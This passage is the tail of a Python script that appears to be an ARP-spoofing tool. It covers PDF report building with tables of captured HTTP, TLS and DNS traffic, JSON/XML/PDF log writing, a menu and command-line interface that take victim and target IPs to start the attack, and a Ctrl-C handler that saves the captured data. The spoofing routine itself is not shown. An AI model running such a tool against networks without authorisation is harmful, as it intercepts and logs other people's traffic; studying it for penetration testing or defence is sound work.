        ["HTTP Requests", httpStats.get("total", 0)],
        ["Unique Hosts", httpStats.get("uniqueHosts", 0)],
        ["Methods", ", ".join([f"{k}: {v}" for k, v in httpStats.get("methods", {}).items()])]
    ]
    elements.append(KeepTogether([
        Paragraph("HTTP Traffic", bodyStyle),
        Spacer(1, 5),
        Table(httpTableData, colWidths=[150, 250]),
        Spacer(1, 15),
    ]))

    # TLS Statistics Table
    tlsStats = protocolData["protocols"]["tls"]["statistics"]
    tlsTableData = [
        ["TLS Handshakes", tlsStats.get("total", 0)],
        ["Unique Domains", tlsStats.get("uniqueDomains", 0)]
    ]
    elements.append(KeepTogether([
        Paragraph("TLS Traffic", bodyStyle),
        Spacer(1, 5),
        Table(tlsTableData, colWidths=[150, 250]),
        Spacer(1, 20),
        CreatePurpleLine(),
        Spacer(1, 20),
    ]))

    # --- Recent DNS Queries (Optimized) ---
    if dnsStats.get("total", 0) > 0:
        topDnsQueries = protocolData["protocols"]["dns"]["queries"][:10]
        dnsQueriesData = [["Source", "Domain", "Type"]]  # Removed timestamp column
        dnsQueriesData.extend([
            [q.get("src_ip", ""), 
             q.get("domain", "")[:35],  # Increased domain width
             q.get("type", "")]
            for q in topDnsQueries
        ])
        
        elements.append(KeepTogether([
            Paragraph("Recent DNS Queries", heading2Style),
            Spacer(1, 10),
            Table(dnsQueriesData, 
                 colWidths=[100, 220, 60],  # Adjusted column widths
                 style=TableStyle([
                     ('BACKGROUND', (0,0), (-1,0), colors.HexColor('#461f6b')),
                     ('TEXTCOLOR', (0,0), (-1,0), colors.white),
                     ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
                     ('FONTSIZE', (0,0), (-1,0), 8),
                     ('ALIGN', (0,0), (-1,0), 'CENTER'),
                     ('BACKGROUND', (0,1), (-1,-1), colors.HexColor('#f5f5f5')),
                     ('GRID', (0,0), (-1,-1), 0.5, colors.grey),
                     ('FONTSIZE', (0,1), (-1,-1), 8),
                 ])),
            Spacer(1, 20),
            CreatePurpleLine(),
            Spacer(1, 20),
        ]))

    # --- Security Recommendations (Updated Formatting) ---
    firstRecommendation = True
    for recommendation in RECOMMENDATIONS:
        recommendationBlock = []
        if firstRecommendation:
            recommendationBlock += [
                Paragraph("Security Recommendations", heading2Style),
                Spacer(1, 10),
            ]
            firstRecommendation = False

        # Capitalize 'Recommendation' in specific details
        details = recommendation.get('specificDetails', {}).copy()
        if 'recommendation' in details:
            details['Recommendation'] = details.pop('recommendation')

        recommendationBlock += [
            Paragraph(f"<b>Recommendation {recommendation['id']}: {recommendation['title']}</b> (Severity: {recommendation['severity']})", 
                      bodyStyle),
            Spacer(1, 5),
            Paragraph(recommendation['description'], bodyStyle),
            Spacer(1, 5),
        ]

        if details:
            detailLines = "<br/>".join([f"<b>{key}:</b> {value}" for key, value in details.items()])
            recommendationBlock += [
                Paragraph(detailLines, bodyStyle),
                Spacer(1, 5),
            ]

        # Numbered sources
        recommendationBlock += [
            Paragraph("<b>References:</b>", bodyStyle),
            Spacer(1, 3),
        ]
        for idx, source in enumerate(recommendation['sources'], 1):
            recommendationBlock += [
                Paragraph(f"{idx}. {source}", bodyStyle),
                Spacer(1, 3),
            ]
            
        elements.append(KeepTogether([
            *recommendationBlock,
            Spacer(1, 15)
        ]))

    # --- Generate PDF ---
    doc.build(elements)
    print(f"\n{BOLD}PDF Report written to:{RESET} {filePath}")

def WriteLogs(target1, target2, arpPacketsSent, capturedPackets, duration, fmt, protocolData=None):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    if fmt == 'json':
        # path = os.path.join(logDir, f"arpspooflog_{timestamp}.json")
        path = f"arpspooflog_{timestamp}.json"
        WriteJsonLog(path, target1, target2, arpPacketsSent, capturedPackets, duration, protocolData)
    elif fmt == 'xml':
        # path = os.path.join(logDir, f"arpspooflog_{timestamp}.xml")
        path = f"arpspooflog_{timestamp}.xml"
        WriteXmlLog(path, target1, target2, arpPacketsSent, capturedPackets, duration, protocolData)
    elif fmt == 'pdf':
        # path = os.path.join(logDir, f"arpspooflog_{timestamp}.pdf")
        path = f"arpspooflog_{timestamp}.pdf"
        WritePdfLog(path, target1, target2, arpPacketsSent, capturedPackets, duration, protocolData)
    elif fmt == 'all':
        # path = os.path.join(logDir, f"arpspooflog_{timestamp}.json")
        path = f"arpspooflog_{timestamp}.json"
        WriteJsonLog(path, target1, target2, arpPacketsSent, capturedPackets, duration, protocolData)
        # path = os.path.join(logDir, f"arpspooflog_{timestamp}.xml")
        path = f"arpspooflog_{timestamp}.xml"
        WriteXmlLog(path, target1, target2, arpPacketsSent, capturedPackets, duration, protocolData)
        # path = os.path.join(logDir, f"arpspooflog_{timestamp}.pdf")
        path = f"arpspooflog_{timestamp}.pdf"
        WritePdfLog(path, target1, target2, arpPacketsSent, capturedPackets, duration, protocolData)

def menu():
    global target1, target2  # Declare the variables as global
    target1 = input(f"{RED}\nTarget 1 IP: {RESET}")
    target2 = input(f"{RED}Target 2 IP: {RESET}")
    interface = input(f"{RED}Interface: {RESET}")
    show = input("Do you want to show captured packets on screen? [Y/N]: ")
    if show.lower() == "y":
        startAttack(target1, target2, interface, True)
    else:
        startAttack(target1, target2, interface, False)

def terminal():
    global target1, target2  # Declare the variables as global
    parser = argparse.ArgumentParser(description="ARP Spoofing", formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-t1", "--target1", required=True, help="Victim IP address.")
    parser.add_argument("-t2", "--target2", required=True, help="Target IP address.")
    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.")
    parser.add_argument("-r", "--report", action="store_true", help="Create a report.")

    args = parser.parse_args()

    # Set the global target IP variables from command-line arguments
    target1 = args.target1
    target2 = args.target2

    if args.target1 and args.target2 and args.interface:
        if args.report:
            startAttack(target1, target2, args.interface, 1)
        else:
            startAttack(target1, target2, args.interface, 0)
    else:
        parser.error("Syntax error.")

def signalHandler(sig, frame):
    global running, stopTimer
    print(f"\n{RED}Stopping the attack...{RESET}")
    running = False
    stopTimer = True
    
    # Give threads a moment to stop
    time.sleep(1)
    
    # Ensure processor exists and is finalized
    if 'processor' in globals() and processor:
        processor.Finalize()
        protocol_data = processor.protocolData
    else:
        protocol_data = None
    
    formatChoice = input(
        f"\nSave report as {BOLD}[XML]{RESET}, {BOLD}[JSON]{RESET}, {BOLD}[PDF]{RESET} or {BOLD}[ALL]{RESET} "
        "(leave blank for none): "
    ).strip().lower()

    if formatChoice in ('xml', 'json', 'pdf', 'all'):
        # For XML specifically, ensure Scapy is completely stopped
        if formatChoice in ('xml', 'all'):
            time.sleep(1)  # Additional delay for XML
        WriteLogs(target1, target2, arpPacketsSent, capturedPackets, 
                time.time() - startTime, formatChoice, protocol_data)
    else:
        print(f"{RED}No log saved.{RESET}")

    sys.exit(0)


def main():
    signal.signal(signal.SIGINT, signalHandler)  
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()